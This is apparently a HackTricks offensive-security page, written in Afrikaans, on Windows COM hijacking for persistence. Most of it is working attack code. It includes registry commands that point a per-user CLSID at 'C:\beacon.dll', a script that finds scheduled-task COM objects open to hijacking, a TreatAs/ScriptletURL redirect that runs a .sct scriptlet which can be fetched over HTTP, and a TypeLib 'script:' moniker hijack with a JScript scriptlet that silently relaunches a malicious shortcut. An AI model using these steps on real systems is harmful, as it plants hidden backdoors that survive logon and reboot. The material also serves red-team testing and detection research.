# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Searching non-existent COM components

Aangesien die waardes in HKCU deur gebruikers verander kan word, kan **COM Hijacking** as 'n **persistence mechanism** gebruik word. Met `procmon` is dit maklik om gesoekte COM-registrasies te vind wat nog nie bestaan nie en deur 'n aanvaller geskep kan word. Klassieke filters:

- **RegOpenKey** operations.
- waar die _Result_ **NAME NOT FOUND** is.
- en die _Path_ eindig met **InprocServer32**.

Nuttige variasies tydens hunting:

- Kyk ook vir ontbrekende **`LocalServer32`** sleutels. Sommige COM-klasse is out-of-process servers en sal 'n deur 'n aanvaller-beheerde EXE inisieer in plaas van 'n DLL.
- Soek na **`TreatAs`** en **`ScriptletURL`** registerbewerkings benewens `InprocServer32`. Onlangse detection content en malware writeups noem dit gereeld omdat dit baie skaars is in vergelyking met normale COM-registrasies en dus high-signal.
- Kopieer die legitime **`ThreadingModel`** vanaf die oorspronklike `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` wanneer jy 'n registrasie in HKCU kloon. Die gebruik van die verkeerde model breek dikwels activation en maak die hijack noisy.
- Op 64-bit stelsels inspekteer beide 64-bit en 32-bit aansigte (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` en `HKLM\Software\Classes\WOW6432Node`), want 32-bit toepassings kan na 'n ander COM-registrasie verwys.

Sodra jy besluit het watter nie-bestaande COM om te impersonate, voer die volgende opdragte uit. _Wees versigtig as jy besluit om 'n COM te impersonate wat elke paar sekondes gelaai word, aangesien dit oorbodig kan wees._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Gekapbare Task Scheduler COM-komponente

Windows Tasks gebruik Custom Triggers om COM objects aan te roep en omdat hulle deur die Task Scheduler uitgevoer word, is dit makliker om te voorspel wanneer hulle geaktiveer gaan word.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Deur die output te kontroleer kan jy byvoorbeeld een kies wat **elke keer as 'n gebruiker aanmeld** uitgevoer sal word.

As jy nou soek na die CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\CLASSES\ROOT\CLSID** en in HKLM en HKCU, sal jy gewoonlik vind dat die waarde nie in HKCU bestaan nie.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Dan kan jy net die HKCU-invoer skep en elke keer wanneer die gebruiker aanmeld, sal jou backdoor geaktiveer word.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` laat toe dat een CLSID deur 'n ander nageboots word. Vanuit 'n offensiewe perspektief beteken dit jy kan die oorspronklike CLSID onaangeraak laat, 'n tweede per-gebruiker CLSID skep wat na `scrobj.dll` wys, en dan die werklike COM-objek herlei na die kwaadwillige een met `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Dit is nuttig wanneer:

- die teiken-toepassing reeds 'n stabiele CLSID instansieer tydens aanmelding of wanneer die toepassing begin
- jy 'n slegs-register-herleiding wil hê in plaas daarvan om die oorspronklike `InprocServer32` te vervang
- jy 'n plaaslike of afgeleë `.sct` scriptlet wil uitvoer deur die `ScriptletURL`-waarde

Voorbeeld-werkvloei (aangepas van openbare Atomic Red Team tradecraft en ouer COM registry abuse research):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Notes:

- `scrobj.dll` lees die `ScriptletURL`-waarde en voer die verwysde `.sct` uit, so jy kan die payload as 'n plaaslike lêer hou of dit oor HTTP/HTTPS aflaai.
- `TreatAs` is veral handig wanneer die oorspronklike COM-registrasie volledig en stabiel in HKLM is, want jy het net 'n klein per-user-omleiding nodig in plaas van om die hele boom te spiegel.
- Vir validasie sonder om op die natuurlike trigger te wag, kan jy die valse ProgID/CLSID handmatig instansieer met `rundll32.exe -sta <ProgID-or-CLSID>` as die teikenklas STA activation ondersteun.

## COM TypeLib Hijacking (script: moniker persistence)

Tipebiblioteke (TypeLib) definieer COM-koppelvlakke en word gelaai via `LoadTypeLib()`. Wanneer 'n COM-server geïnstansieer word, kan die OS ook die geassosieerde TypeLib laai deur registersleutels onder `HKCR\TypeLib\{LIBID}` te raadpleeg. As die TypeLib-pad vervang word met 'n **moniker**, bv. `script:C:\...\evil.sct`, sal Windows die scriptlet uitvoer wanneer die TypeLib opgelos word – wat 'n stealthy persistence oplewer wat getrigger word wanneer algemene komponente geraak word.

Hierdie is waargeneem teen die Microsoft Web Browser control (wat gereeld deur Internet Explorer, toepassings wat WebBrowser inbed, en selfs `explorer.exe` gelaai word).

### Stappe (PowerShell)

1) Identifiseer die TypeLib (LIBID) wat deur 'n hoë-frekwensie CLSID gebruik word. Voorbeeld CLSID wat dikwels deur malware-kettinge misbruik word: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Wys die per-gebruiker TypeLib-pad na 'n plaaslike scriptlet met die `script:` moniker (geen adminregte nodig):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Drop 'n minimale JScript `.sct` wat jou primêre payload herbegin (bv. 'n `.lnk` wat deur die aanvanklike ketting gebruik word):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Aktivering – om IE te open, 'n toepassing wat die WebBrowser control inkorporeer, of selfs roetine Explorer-aktiwiteit sal die TypeLib laai en die scriptlet uitvoer, en jou ketting by logon/reboot heraktiveer.

Opruiming
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Aantekeninge
- Jy kan dieselfde logika op ander algemeen gebruikte COM-komponente toepas; los altyd eers die werklike `LIBID` vanaf `HKCR\CLSID\{CLSID}\TypeLib` op.
- Op 64-bit stelsels kan jy ook die `win64` subkey vul vir 64-bit gebruikers.

## Verwysings

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
